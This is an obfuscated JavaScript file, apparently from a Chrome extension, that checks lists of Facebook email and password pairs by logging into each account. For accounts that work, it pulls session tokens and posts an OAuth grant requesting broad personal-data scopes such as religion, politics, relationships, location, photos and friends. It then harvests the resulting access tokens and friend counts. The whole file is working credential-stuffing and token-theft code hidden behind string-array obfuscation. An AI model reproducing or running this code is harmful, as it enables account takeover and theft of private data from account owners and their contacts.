var _0x6625=["https://www.facebook.com/n/?notifications&mid=x46fdf8G5af4213825a3G0Gdx%27","image/loading.gif","getURL","extension","image/live.png","image/die.gif","image/checkpoint.png","image/confirm.gif","6628568379","check","html/check.html","hide","head","body","html","get","trim","val","#list_account","#id_app","","text","#tbody",".i.n list t�i kho.n facebook!","split","match","|","<tr>","<td style="font-weight: bold; text-align: center;">","</td>","<td>","<td class="friend_",""></td>","<td style="text-align: center;" class="log_",""><img src="","" ></td>","</tr>","push","each","append","length","click","#btn_start","ready","https://m.facebook.com/login.php","email=","user","&pass=","pass","CONFIRM_EMAIL","indexOf","CONFIRM_PHONE","<img src="","">",".log_","fb_dtsg","fb_dtsg\" value=\"","\"","checkpoint","r.php?loc=bottom&amp;refid=9","post","https://www.facebook.com/v1.0/dialog/oauth/read","fb_dtsg=","&app_id=","&redirect_uri=fbconnect%3A%2F%2Fsuccess&display=popup&access_token=&sdk=&from_post=1&private=&login=&read=user_birthday%2Cuser_religion_politics%2Cuser_relationships%2Cuser_relationship_details%2Cuser_hometown%2Cuser_location%2Cuser_likes%2Cuser_education_history%2Cuser_work_history%2Cuser_website%2Cuser_groups%2Cuser_events%2Cuser_photos%2Cuser_videos%2Cuser_friends%2Cuser_about_me%2Cuser_status%2Cuser_games_activity%2Cuser_activities&write=&readwrite=&extended=&social_confirm=&confirm=&seen_scopes=user_birthday%2Cuser_religion_politics%2Cuser_relationships%2Cuser_relationship_details%2Cuser_hometown%2Cuser_location%2Cuser_likes%2Cuser_education_history%2Cuser_work_history%2Cuser_website%2Cuser_groups%2Cuser_events%2Cuser_photos%2Cuser_videos%2Cuser_friends%2Cuser_about_me%2Cuser_status%2Cuser_games_activity%2Cuser_activities&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1","access_token=","&expires_in","https://graph.facebook.com/v2.3/me/friends?access_token=","&format=json&method=get","total_count","summary",".friend_","
","#list_token","\]","replace","\[","[\?&]","=([^&#]*)","search","exec"," "];var URL_LOGOUT=_0x6625[0];var loading_icon=chrome[_0x6625[3]][_0x6625[2]](_0x6625[1]);var live_icon=chrome[_0x6625[3]][_0x6625[2]](_0x6625[4]);var die_icon=chrome[_0x6625[3]][_0x6625[2]](_0x6625[5]);var checkpoint_icon=chrome[_0x6625[3]][_0x6625[2]](_0x6625[6]);var confirm_icon=chrome[_0x6625[3]][_0x6625[2]](_0x6625[7]);var ListAccount= new Array();var id_app=_0x6625[8];var count_list=0;if(_get(_0x6625[9])){$[_0x6625[15]](chrome[_0x6625[3]][_0x6625[2]](_0x6625[10]),function(_0xa991xa){$(_0x6625[12])[_0x6625[11]]();$(_0x6625[13])[_0x6625[11]]();$(_0x6625[14])[_0x6625[14]](_0xa991xa);})};$(document)[_0x6625[43]](function(){$(_0x6625[42])[_0x6625[41]](function(){var _0xa991xb=$(_0x6625[18])[_0x6625[17]]()[_0x6625[16]]();id_app=$(_0x6625[19])[_0x6625[17]]()[_0x6625[16]]();ListAccount= new Array();count_list=0;$(_0x6625[22])[_0x6625[21]](_0x6625[20]);if(_0xa991xb==_0x6625[20]){alert(_0x6625[23])}else {var _0xa991xc=_0x6625[20];var _0xa991xd=_0xa991xb[_0x6625[24]](/\n/);var _0xa991xe=0;jQuery[_0x6625[38]](_0xa991xd,function(_0xa991xf,_0xa991x10){if(_0xa991x10[_0x6625[25]](/.+|.+/g)){_0xa991xe++;var _0xa991x11=_0xa991x10[_0x6625[24]](_0x6625[26]);_0xa991xc+=_0x6625[27];_0xa991xc+=_0x6625[28]+_0xa991xe+_0x6625[29];_0xa991xc+=_0x6625[30]+_0xa991x10+_0x6625[29];_0xa991xc+=_0x6625[31]+_0xa991x11[0]+_0x6625[32];_0xa991xc+=_0x6625[33]+_0xa991x11[0]+_0x6625[34]+loading_icon+_0x6625[35];_0xa991xc+=_0x6625[36];ListAccount[_0x6625[37]]( new FBAccount(_0xa991x11[0],_0xa991x11[1]));}});$(_0x6625[22])[_0x6625[39]](_0xa991xc);};CheckAccount(ListAccount,count_list,ListAccount[_0x6625[40]]);})});function CheckAccount(_0xa991x13,_0xa991xe,_0xa991x14){if(_0xa991xe<_0xa991x14){$[_0x6625[60]](_0x6625[44],_0x6625[45]+_0xa991x13[_0xa991xe][_0x6625[46]]+_0x6625[47]+_0xa991x13[_0xa991xe][_0x6625[48]],function(_0xa991xa){if(_0xa991xa[_0x6625[50]](_0x6625[49])>-1||_0xa991xa[_0x6625[50]](_0x6625[51])> -1){$(_0x6625[54]+_0xa991x13[_0xa991xe][_0x6625[46]])[_0x6625[14]](_0x6625[52]+confirm_icon+_0x6625[53]);$[_0x6625[15]](URL_LOGOUT,function(_0xa991xa){_0xa991xe++;CheckAccount(_0xa991x13,_0xa991xe,_0xa991x14);});}else {if(_0xa991xa[_0x6625[50]](_0x6625[55])> -1){var _0xa991x15=GetBetween(_0xa991xa,_0x6625[56],_0x6625[57]);GetToken(_0xa991x13,_0xa991xe,_0xa991x14,_0xa991x15,id_app);}else {if(_0xa991xa[_0x6625[50]](_0x6625[58])> -1){$(_0x6625[54]+_0xa991x13[_0xa991xe][_0x6625[46]])[_0x6625[14]](_0x6625[52]+checkpoint_icon+_0x6625[53]);$[_0x6625[15]](URL_LOGOUT,function(_0xa991xa){_0xa991xe++;CheckAccount(_0xa991x13,_0xa991xe,_0xa991x14);});}else {if(_0xa991xa[_0x6625[50]](_0x6625[59])> -1){$(_0x6625[54]+_0xa991x13[_0xa991xe][_0x6625[46]])[_0x6625[14]](_0x6625[52]+die_icon+_0x6625[53]);$[_0x6625[15]](URL_LOGOUT,function(_0xa991xa){_0xa991xe++;CheckAccount(_0xa991x13,_0xa991xe,_0xa991x14);});}else {$(_0x6625[54]+_0xa991x13[_0xa991xe][_0x6625[46]])[_0x6625[14]](_0x6625[52]+die_icon+_0x6625[53]);$[_0x6625[15]](URL_LOGOUT,function(_0xa991xa){_0xa991xe++;CheckAccount(_0xa991x13,_0xa991xe,_0xa991x14);});}}}}})}}function GetToken(_0xa991x13,_0xa991xe,_0xa991x14,_0xa991x15,id_app){$[_0x6625[60]](_0x6625[61],_0x6625[62]+_0xa991x15+_0x6625[63]+id_app+_0x6625[64],function(_0xa991xa){var _0xa991x17=GetBetween(_0xa991xa,_0x6625[65],_0x6625[66]);GetInFo(_0xa991x13,_0xa991xe,_0xa991x14,_0xa991x17);})}function GetInFo(_0xa991x13,_0xa991xe,_0xa991x14,_0xa991x17){$[_0x6625[15]](_0x6625[67]+_0xa991x17+_0x6625[68],function(_0xa991xa){$(_0x6625[54]+_0xa991x13[_0xa991xe][_0x6625[46]])[_0x6625[14]](_0x6625[52]+live_icon+_0x6625[53]);$(_0x6625[71]+_0xa991x13[_0xa991xe][_0x6625[46]])[_0x6625[21]](_0xa991xa[_0x6625[70]][_0x6625[69]]);$(_0x6625[73])[_0x6625[39]](_0xa991x17+_0x6625[72]);$[_0x6625[15]](URL_LOGOUT,function(_0xa991xa){_0xa991xe++;CheckAccount(_0xa991x13,_0xa991xe,_0xa991x14);});})}function FBAccount(_0xa991x1a,_0xa991x1b){this[_0x6625[46]]=_0xa991x1a;this[_0x6625[48]]=_0xa991x1b;}function GetBetween(_0xa991x1d,_0xa991x1e,_0xa991x1f){var _0xa991x20=_0xa991x1d[_0x6625[24]](_0xa991x1e);if((_0xa991x20[1])){_0xa991x20=_0xa991x20[1][_0x6625[24]](_0xa991x1f);return _0xa991x20[0];};return 0;}function _get(_0xa991x22){_0xa991x22=_0xa991x22[_0x6625[75]](/[\[]/,_0x6625[76])[_0x6625[75]](/[\]]/,_0x6625[74]);var _0xa991x23= new RegExp(_0x6625[77]+_0xa991x22+_0x6625[78]),_0xa991x24=_0xa991x23[_0x6625[80]](location[_0x6625[79]]);return _0xa991x24===null?_0x6625[20]:decodeURIComponent(_0xa991x24[1][_0x6625[75]](/\+/g,_0x6625[81]));}